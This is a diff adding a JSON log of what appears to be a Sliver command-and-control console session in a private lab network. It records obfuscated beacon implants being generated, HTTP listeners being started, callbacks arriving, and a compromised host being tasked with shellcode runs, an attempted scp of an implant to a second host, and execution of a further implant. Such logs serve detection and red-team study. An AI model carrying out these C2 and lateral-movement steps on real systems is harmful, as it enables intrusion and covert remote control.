@@ -1,0 +1,170 @@
+{"time":"2023-09-20T00:50:01.098485386Z","level":"DEBUG","msg":"generate beacon --http 10.0.0.6 --os linux --save .","type":"command"}
+{"time":"2023-09-20T00:50:01.10967922Z","level":"INFO","msg":"Generating new linux/amd64 beacon implant binary (1m0s)\n"}
+{"time":"2023-09-20T00:50:01.109954511Z","level":"INFO","msg":"\u001b[1mSymbol obfuscation is enabled\u001b[0m\n"}
+{"time":"2023-09-20T00:50:21.876225424Z","level":"INFO","msg":"Build completed in 21s\n"}
+{"time":"2023-09-20T00:50:21.888249132Z","level":"INFO","msg":"Implant saved to /home/sliver/BORING_SCORN\n"}
+{"time":"2023-09-20T00:50:29.861464052Z","level":"DEBUG","msg":"generate beacon --http 10.0.0.3 --os linux --save .","type":"command"}
+{"time":"2023-09-20T00:50:29.862257969Z","level":"INFO","msg":"Generating new linux/amd64 beacon implant binary (1m0s)\n"}
+{"time":"2023-09-20T00:50:29.862326511Z","level":"INFO","msg":"\u001b[1mSymbol obfuscation is enabled\u001b[0m\n"}
+{"time":"2023-09-20T00:50:43.255619419Z","level":"INFO","msg":"Build completed in 13s\n"}
+{"time":"2023-09-20T00:50:43.277850253Z","level":"INFO","msg":"Implant saved to /home/sliver/TIRED_GUN\n"}
+{"time":"2023-09-20T00:51:29.794024719Z","level":"DEBUG","msg":"http","type":"command"}
+{"time":"2023-09-20T00:51:29.800101677Z","level":"INFO","msg":"Starting HTTP :80 listener ...\n"}
+{"time":"2023-09-20T00:51:29.965880094Z","level":"INFO","msg":"Successfully started job #1\n"}
+{"time":"2023-09-20T00:51:40.751693002Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T00:51:40.768016252Z","level":"INFO","msg":"No beacons 🙁\n"}
+{"time":"2023-09-20T00:51:43.65635842Z","level":"DEBUG","msg":"http","type":"command"}
+{"time":"2023-09-20T00:51:43.66245267Z","level":"INFO","msg":"Starting HTTP :80 listener ...\n"}
+{"time":"2023-09-20T00:51:44.337115712Z","level":"INFO","msg":"Successfully started job #2\n"}
+{"time":"2023-09-20T00:51:44.337284128Z","level":"ERROR","msg":"Job #2 stopped (tcp/http)"}
+{"time":"2023-09-20T00:51:44.340961837Z","level":"ERROR","msg":"Job #2 stopped (tcp/http)"}
+{"time":"2023-09-20T00:51:47.403216796Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T00:51:47.417486046Z","level":"INFO","msg":"No beacons 🙁\n"}
+{"time":"2023-09-20T00:52:18.647786005Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T00:52:18.658521755Z","level":"INFO","msg":"No beacons 🙁\n"}
+{"time":"2023-09-20T00:52:40.112855043Z","level":"DEBUG","msg":"http","type":"command"}
+{"time":"2023-09-20T00:52:40.120646543Z","level":"INFO","msg":"Starting HTTP :80 listener ...\n"}
+{"time":"2023-09-20T00:52:41.564130294Z","level":"INFO","msg":"Successfully started job #3\n"}
+{"time":"2023-09-20T00:52:41.564223627Z","level":"ERROR","msg":"Job #3 stopped (tcp/http)"}
+{"time":"2023-09-20T00:52:41.566821169Z","level":"ERROR","msg":"Job #3 stopped (tcp/http)"}
+{"time":"2023-09-20T00:53:11.178780252Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T00:53:11.189116877Z","level":"INFO","msg":"No beacons 🙁\n"}
+{"time":"2023-09-20T00:55:47.57285088Z","level":"DEBUG","msg":"generate beacon --http 10.0.0.2 --os linux --save .","type":"command"}
+{"time":"2023-09-20T00:55:47.582634213Z","level":"INFO","msg":"Generating new linux/amd64 beacon implant binary (1m0s)\n"}
+{"time":"2023-09-20T00:55:47.582850338Z","level":"INFO","msg":"\u001b[1mSymbol obfuscation is enabled\u001b[0m\n"}
+{"time":"2023-09-20T00:55:59.283111177Z","level":"INFO","msg":"Build completed in 12s\n"}
+{"time":"2023-09-20T00:55:59.293790052Z","level":"INFO","msg":"Implant saved to /home/sliver/BURNING_OXEN\n"}
+{"time":"2023-09-20T00:56:10.141589918Z","level":"DEBUG","msg":"http","type":"command"}
+{"time":"2023-09-20T00:56:10.145393585Z","level":"INFO","msg":"Starting HTTP :80 listener ...\n"}
+{"time":"2023-09-20T00:56:10.858079085Z","level":"INFO","msg":"Successfully started job #4\n"}
+{"time":"2023-09-20T00:56:12.899465836Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T00:56:12.905362169Z","level":"INFO","msg":" ID         Name           Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ============== =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        8s              \u001b[1m\u001b[32m53s\u001b[0m           "}
+{"time":"2023-09-20T00:59:24.583598175Z","level":"DEBUG","msg":"use ffe8bcf0","type":"command"}
+{"time":"2023-09-20T00:59:24.597194175Z","level":"INFO","msg":"Active beacon BURNING_OXEN (ffe8bcf0-5f5c-4f1a-8cdb-18b7c036a7df)\n"}
+{"time":"2023-09-20T00:59:29.719941677Z","level":"DEBUG","msg":"stage-listener","type":"command"}
+{"time":"2023-09-20T00:59:32.091312387Z","level":"DEBUG","msg":"--help","type":"command"}
+{"time":"2023-09-20T00:59:34.938572971Z","level":"DEBUG","msg":"interactive","type":"command"}
+{"time":"2023-09-20T00:59:34.951938596Z","level":"INFO","msg":"Using beacon's active C2 endpoint: https://10.0.0.2\n"}
+{"time":"2023-09-20T00:59:34.96167068Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (0ff460bb)"}
+{"time":"2023-09-20T01:00:11.775158669Z","level":"DEBUG","msg":"ping 10.0.0.3","type":"command"}
+{"time":"2023-09-20T01:00:20.710629715Z","level":"DEBUG","msg":"sessions","type":"command"}
+{"time":"2023-09-20T01:00:20.724656381Z","level":"INFO","msg":" ID         Transport   Remote Address   Hostname       Username   Operating System   Health  \n========== =========== ================ ============== ========== ================== =========\n \u001b[0mf55f900a\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m10.0.0.2:38752\u001b[0m   \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        \u001b[1m\u001b[32m[ALIVE]\u001b[0m "}
+{"time":"2023-09-20T01:00:26.720902717Z","level":"DEBUG","msg":"use f55f900a","type":"command"}
+{"time":"2023-09-20T01:00:26.736282884Z","level":"INFO","msg":"Active session BURNING_OXEN (f55f900a-a559-4152-8a09-c4bfdb4698af)\n"}
+{"time":"2023-09-20T01:00:31.882382387Z","level":"DEBUG","msg":"ping 10.0.0.3","type":"command"}
+{"time":"2023-09-20T01:00:31.89474947Z","level":"INFO","msg":"Ping 89598\n"}
+{"time":"2023-09-20T01:00:31.900343928Z","level":"INFO","msg":"Pong 89598\n"}
+{"time":"2023-09-20T01:03:59.458708385Z","level":"DEBUG","msg":"--help","type":"command"}
+{"time":"2023-09-20T01:06:28.018627176Z","level":"DEBUG","msg":"execute scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user","type":"command"}
+{"time":"2023-09-20T01:06:28.055148468Z","level":"ERROR","msg":"rpc error: code = Unknown desc = fork/exec scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user: no such file or directory"}
+{"time":"2023-09-20T01:06:41.21754446Z","level":"DEBUG","msg":"execute scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user","type":"command"}
+{"time":"2023-09-20T01:06:41.255806293Z","level":"ERROR","msg":"rpc error: code = Unknown desc = fork/exec scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user: no such file or directory"}
+{"time":"2023-09-20T01:07:13.293834461Z","level":"DEBUG","msg":"execute-shellcode scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user","type":"command"}
+{"time":"2023-09-20T01:07:13.312785128Z","level":"ERROR","msg":"open scp /home/sliver/TIRED_GUN 10.0.0.3:/home/user: no such file or directory\n"}
+{"time":"2023-09-20T01:08:35.336295388Z","level":"DEBUG","msg":"execute-shellcode /home/sliver/run.sh","type":"command"}
+{"time":"2023-09-20T01:09:35.352325263Z","level":"ERROR","msg":"rpc error: code = Unknown desc = implant timeout\n"}
+{"time":"2023-09-20T01:13:17.450884335Z","level":"DEBUG","msg":"execute-shellcode /home/sliver/run.sh","type":"command"}
+{"time":"2023-09-20T01:14:05.970524344Z","level":"DEBUG","msg":"close","type":"command"}
+{"time":"2023-09-20T01:14:10.430922304Z","level":"DEBUG","msg":"background","type":"command"}
+{"time":"2023-09-20T01:14:13.438892875Z","level":"DEBUG","msg":"background","type":"command"}
+{"time":"2023-09-20T01:14:17.473721502Z","level":"ERROR","msg":"rpc error: code = Unknown desc = implant timeout\n"}
+{"time":"2023-09-20T01:14:42.07457493Z","level":"DEBUG","msg":"--help","type":"command"}
+{"time":"2023-09-20T01:15:28.37065134Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T01:15:28.379862465Z","level":"INFO","msg":" ID         Name           Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ============== =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        7m49s           \u001b[1m\u001b[31m6m42s\u001b[0m         \n \u001b[0m5e33bbc1\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        21s             \u001b[1m\u001b[32m1m0s\u001b[0m          "}
+{"time":"2023-09-20T01:15:34.977304427Z","level":"DEBUG","msg":"use 5e33bbc1","type":"command"}
+{"time":"2023-09-20T01:15:34.994524719Z","level":"INFO","msg":"Active beacon BURNING_OXEN (5e33bbc1-21db-4bf8-823a-5d469f0fe16d)\n"}
+{"time":"2023-09-20T01:15:38.960749345Z","level":"DEBUG","msg":"interactive","type":"command"}
+{"time":"2023-09-20T01:15:38.98731797Z","level":"INFO","msg":"Using beacon's active C2 endpoint: https://10.0.0.2\n"}
+{"time":"2023-09-20T01:15:38.995243595Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (1f5729b7)"}
+{"time":"2023-09-20T01:15:40.664369013Z","level":"DEBUG","msg":"sessions","type":"command"}
+{"time":"2023-09-20T01:15:40.675618096Z","level":"INFO","msg":"No sessions 🙁\n"}
+{"time":"2023-09-20T01:15:44.771981959Z","level":"DEBUG","msg":"sessions","type":"command"}
+{"time":"2023-09-20T01:15:44.795193167Z","level":"INFO","msg":"No sessions 🙁\n"}
+{"time":"2023-09-20T01:15:48.532223919Z","level":"DEBUG","msg":"interactive","type":"command"}
+{"time":"2023-09-20T01:15:48.557625586Z","level":"INFO","msg":"Using beacon's active C2 endpoint: https://10.0.0.2\n"}
+{"time":"2023-09-20T01:15:48.564273252Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (d363f049)"}
+{"time":"2023-09-20T01:15:55.210950464Z","level":"DEBUG","msg":"use d363f049","type":"command"}
+{"time":"2023-09-20T01:15:55.240822172Z","level":"ERROR","msg":"no session or beacon found with ID d363f049\n"}
+{"time":"2023-09-20T01:16:01.851371592Z","level":"DEBUG","msg":"sessions","type":"command"}
+{"time":"2023-09-20T01:16:01.877137425Z","level":"INFO","msg":"No sessions 🙁\n"}
+{"time":"2023-09-20T01:16:14.934033209Z","level":"DEBUG","msg":"execute-shellcode /home/sliver/run.sh","type":"command"}
+{"time":"2023-09-20T01:16:14.962780709Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (02bcd5d1)"}
+{"time":"2023-09-20T01:16:24.757623172Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T01:16:24.781253047Z","level":"INFO","msg":" ID         State       Message Type   Created                         Sent                            Completed                     "}
+{"time":"2023-09-20T01:16:24.781343339Z","level":"INFO","msg":"========== =========== ============== =============================== =============================== ==============================="}
+{"time":"2023-09-20T01:16:24.781357005Z","level":"INFO","msg":" 02bcd5d1   \u001b[1mpending\u001b[0m     Task           Wed, 20 Sep 2023 01:16:14 UTC                                                                 "}
+{"time":"2023-09-20T01:16:24.781368755Z","level":"INFO","msg":" d363f049   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:48 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:16:24.781380255Z","level":"INFO","msg":" 1f5729b7   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:38 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:16:24.781395964Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T01:16:49.296643544Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T01:16:49.317339169Z","level":"INFO","msg":" ID         State       Message Type   Created                         Sent                            Completed                     "}
+{"time":"2023-09-20T01:16:49.317402711Z","level":"INFO","msg":"========== =========== ============== =============================== =============================== ==============================="}
+{"time":"2023-09-20T01:16:49.317416878Z","level":"INFO","msg":" 02bcd5d1   \u001b[1mpending\u001b[0m     Task           Wed, 20 Sep 2023 01:16:14 UTC                                                                 "}
+{"time":"2023-09-20T01:16:49.317439086Z","level":"INFO","msg":" d363f049   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:48 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:16:49.317452128Z","level":"INFO","msg":" 1f5729b7   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:38 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:16:49.317472044Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T01:17:04.783408385Z","level":"DEBUG","msg":"ls","type":"command"}
+{"time":"2023-09-20T01:17:04.816802385Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (1b29424a)"}
+{"time":"2023-09-20T01:17:09.615045846Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T01:17:09.636563596Z","level":"INFO","msg":" ID         State       Message Type   Created                         Sent                            Completed                     "}
+{"time":"2023-09-20T01:17:09.636640637Z","level":"INFO","msg":"========== =========== ============== =============================== =============================== ==============================="}
+{"time":"2023-09-20T01:17:09.636656179Z","level":"INFO","msg":" 1b29424a   \u001b[1mpending\u001b[0m     Ls             Wed, 20 Sep 2023 01:17:04 UTC                                                                 "}
+{"time":"2023-09-20T01:17:09.636669304Z","level":"INFO","msg":" 02bcd5d1   \u001b[1mpending\u001b[0m     Task           Wed, 20 Sep 2023 01:16:14 UTC                                                                 "}
+{"time":"2023-09-20T01:17:09.636680512Z","level":"INFO","msg":" d363f049   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:48 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:17:09.636694596Z","level":"INFO","msg":" 1f5729b7   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:38 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:17:09.636708471Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T01:18:56.581098714Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T01:18:56.613435339Z","level":"INFO","msg":" ID         State       Message Type   Created                         Sent                            Completed                     "}
+{"time":"2023-09-20T01:18:56.613512673Z","level":"INFO","msg":"========== =========== ============== =============================== =============================== ==============================="}
+{"time":"2023-09-20T01:18:56.613525548Z","level":"INFO","msg":" 1b29424a   \u001b[1m\u001b[33msent\u001b[0m        Ls             Wed, 20 Sep 2023 01:17:04 UTC   Wed, 20 Sep 2023 01:17:23 UTC                                 "}
+{"time":"2023-09-20T01:18:56.613540839Z","level":"INFO","msg":" 02bcd5d1   \u001b[1m\u001b[33msent\u001b[0m        Task           Wed, 20 Sep 2023 01:16:14 UTC   Wed, 20 Sep 2023 01:17:23 UTC                                 "}
+{"time":"2023-09-20T01:18:56.613550423Z","level":"INFO","msg":" d363f049   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:48 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:18:56.613559423Z","level":"INFO","msg":" 1f5729b7   \u001b[1m\u001b[32mcompleted\u001b[0m   OpenSession    Wed, 20 Sep 2023 01:15:38 UTC   Wed, 20 Sep 2023 01:16:12 UTC   Wed, 20 Sep 2023 01:16:12 UTC "}
+{"time":"2023-09-20T01:18:56.613661798Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T03:20:13.592004885Z","level":"DEBUG","msg":"exit","type":"command"}
+{"time":"2023-09-20T03:20:16.097621636Z","level":"DEBUG","msg":"close","type":"command"}
+{"time":"2023-09-20T03:20:16.129606178Z","level":"ERROR","msg":"No active session\n"}
+{"time":"2023-09-20T03:20:18.717481387Z","level":"DEBUG","msg":"background","type":"command"}
+{"time":"2023-09-20T03:20:18.756346637Z","level":"INFO","msg":"Background ...\n"}
+{"time":"2023-09-20T03:20:22.819534375Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T03:20:22.874219583Z","level":"INFO","msg":" ID         Name           Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ============== =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h12m44s        \u001b[1m\u001b[31m2h11m37s\u001b[0m      \n \u001b[0m5e33bbc1\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h3m0s          \u001b[1m\u001b[31m2h1m34s\u001b[0m       "}
+{"time":"2023-09-20T03:20:31.566110462Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T03:20:31.605974837Z","level":"INFO","msg":" ID         Name           Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ============== =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h12m53s        \u001b[1m\u001b[31m2h11m46s\u001b[0m      \n \u001b[0m5e33bbc1\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h3m9s          \u001b[1m\u001b[31m2h1m43s\u001b[0m       \n \u001b[0m672c00ae\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        4s              \u001b[1m\u001b[32m1m21s\u001b[0m         "}
+{"time":"2023-09-20T03:21:03.199824338Z","level":"DEBUG","msg":"generate beacon --http 10.0.0.2 --os linux --save .","type":"command"}
+{"time":"2023-09-20T03:21:03.236114047Z","level":"INFO","msg":"Generating new linux/amd64 beacon implant binary (1m0s)\n"}
+{"time":"2023-09-20T03:21:03.236403547Z","level":"INFO","msg":"\u001b[1mSymbol obfuscation is enabled\u001b[0m\n"}
+{"time":"2023-09-20T03:21:16.651172011Z","level":"INFO","msg":"Build completed in 13s\n"}
+{"time":"2023-09-20T03:21:16.663645428Z","level":"INFO","msg":"Implant saved to /home/sliver/EARLY_QUESTION\n"}
+{"time":"2023-09-20T03:21:31.102070712Z","level":"DEBUG","msg":"use 672c00ae","type":"command"}
+{"time":"2023-09-20T03:21:31.133381754Z","level":"INFO","msg":"Active beacon BURNING_OXEN (672c00ae-7c02-4aad-a537-c19b195ec42f)\n"}
+{"time":"2023-09-20T03:21:42.873363384Z","level":"DEBUG","msg":"execute /home/sliver/EARLY_QUESTION","type":"command"}
+{"time":"2023-09-20T03:21:42.905168551Z","level":"INFO","msg":"Tasked beacon BURNING_OXEN (7347f9f4)"}
+{"time":"2023-09-20T03:21:52.954932833Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T03:21:52.977151833Z","level":"INFO","msg":" ID         State     Message Type   Created                         Sent   Completed "}
+{"time":"2023-09-20T03:21:52.977273583Z","level":"INFO","msg":"========== ========= ============== =============================== ====== ==========="}
+{"time":"2023-09-20T03:21:52.977382292Z","level":"INFO","msg":" 7347f9f4   \u001b[1mpending\u001b[0m   Execute        Wed, 20 Sep 2023 03:21:42 UTC                    "}
+{"time":"2023-09-20T03:21:52.977421458Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T03:22:23.323288292Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T03:22:28.056085794Z","level":"DEBUG","msg":"background","type":"command"}
+{"time":"2023-09-20T03:22:28.090498502Z","level":"INFO","msg":"Background ...\n"}
+{"time":"2023-09-20T03:22:30.166330587Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T03:22:30.189766253Z","level":"INFO","msg":" ID         Name           Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ============== =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h14m51s        \u001b[1m\u001b[31m2h13m44s\u001b[0m      \n \u001b[0m5e33bbc1\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h5m7s          \u001b[1m\u001b[31m2h3m41s\u001b[0m       \n \u001b[0m672c00ae\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        51s             \u001b[1m\u001b[32m19s\u001b[0m           "}
+{"time":"2023-09-20T03:22:58.243253586Z","level":"DEBUG","msg":"use 672c00ae","type":"command"}
+{"time":"2023-09-20T03:22:58.265129919Z","level":"INFO","msg":"Active beacon BURNING_OXEN (672c00ae-7c02-4aad-a537-c19b195ec42f)\n"}
+{"time":"2023-09-20T03:23:01.666058296Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T03:23:01.712198629Z","level":"INFO","msg":" ID         State     Message Type   Created                         Sent   Completed "}
+{"time":"2023-09-20T03:23:01.712268004Z","level":"INFO","msg":"========== ========= ============== =============================== ====== ==========="}
+{"time":"2023-09-20T03:23:01.712279462Z","level":"INFO","msg":" 7347f9f4   \u001b[1mpending\u001b[0m   Execute        Wed, 20 Sep 2023 03:21:42 UTC                    "}
+{"time":"2023-09-20T03:23:01.712302837Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T03:23:43.059144968Z","level":"DEBUG","msg":"tasks","type":"command"}
+{"time":"2023-09-20T03:23:43.090182343Z","level":"INFO","msg":" ID         State       Message Type   Created                         Sent                            Completed                     "}
+{"time":"2023-09-20T03:23:43.090275301Z","level":"INFO","msg":"========== =========== ============== =============================== =============================== ==============================="}
+{"time":"2023-09-20T03:23:43.090290135Z","level":"INFO","msg":" 7347f9f4   \u001b[1m\u001b[32mcompleted\u001b[0m   Execute        Wed, 20 Sep 2023 03:21:42 UTC   Wed, 20 Sep 2023 03:23:04 UTC   Wed, 20 Sep 2023 03:23:04 UTC "}
+{"time":"2023-09-20T03:23:43.090350051Z","level":"INFO","msg":"%!(EXTRA []interface {}=[])"}
+{"time":"2023-09-20T03:23:48.326250929Z","level":"DEBUG","msg":"background","type":"command"}
+{"time":"2023-09-20T03:23:48.344159845Z","level":"INFO","msg":"Background ...\n"}
+{"time":"2023-09-20T03:23:50.54497668Z","level":"DEBUG","msg":"beacons","type":"command"}
+{"time":"2023-09-20T03:23:50.558957305Z","level":"INFO","msg":" ID         Name             Transport   Hostname       Username   Operating System   Last Check-In   Next Check-In \n========== ================ =========== ============== ========== ================== =============== ===============\n \u001b[0mffe8bcf0\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m     \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h16m12s        \u001b[1m\u001b[31m2h15m5s\u001b[0m       \n \u001b[0m5e33bbc1\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m     \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        2h6m28s         \u001b[1m\u001b[31m2h5m2s\u001b[0m        \n \u001b[0m672c00ae\u001b[0m   \u001b[0mBURNING_OXEN\u001b[0m     \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        47s             \u001b[1m\u001b[31m47s\u001b[0m           \n \u001b[0m2603f4ab\u001b[0m   \u001b[0mEARLY_QUESTION\u001b[0m   \u001b[0mhttp(s)\u001b[0m     \u001b[0m2c6ab9987174\u001b[0m   \u001b[0msliver\u001b[0m     \u001b[0mlinux/amd64\u001b[0m        46s             \u001b[1m\u001b[32m26s\u001b[0m           "}
+{"time":"2023-09-20T03:43:59.664649881Z","level":"DEBUG","msg":"use 672c00ae","type":"command"}
+{"time":"2023-09-20T03:43:59.701967547Z","level":"INFO","msg":"Active beacon BURNING_OXEN (672c00ae-7c02-4aad-a537-c19b195ec42f)\n"}
+{"time":"2023-09-20T03:44:07.806833968Z","level":"DEBUG","msg":"--help","type":"command"}
